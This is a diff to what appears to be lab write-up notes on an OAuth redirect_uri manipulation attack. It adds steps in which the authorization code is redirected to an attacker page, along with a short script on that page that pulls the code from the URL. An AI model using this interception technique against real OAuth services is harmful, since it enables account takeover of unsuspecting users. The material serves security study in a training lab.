@@ -369,5 +369,23 @@ Attacker forces a **fake redirect_uri** using a hidden parameter:
 ##### 3. Victim Authorizes the App
 
 - Victim logs in to OAuth provider
-    
 - Authorization server redirects **authorization code** to attacker’s domain
+
+```
+http://dev.bistro.thm:8002/malicious_redirect.html?code=VRIHINF366aUPSAgtNUAkdcA8h5mKD
+```
+##### 4. Attacker Intercepts Authorization Code
+
+Attacker-controlled page extracts the code:
+
+```
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const code = params.get('code');
+  console.log("Intercepted Authorization Code:", code);
+</script>
+```
+
+✔ Victim does not notice the interception  
+✔ Redirect happens very fast
+
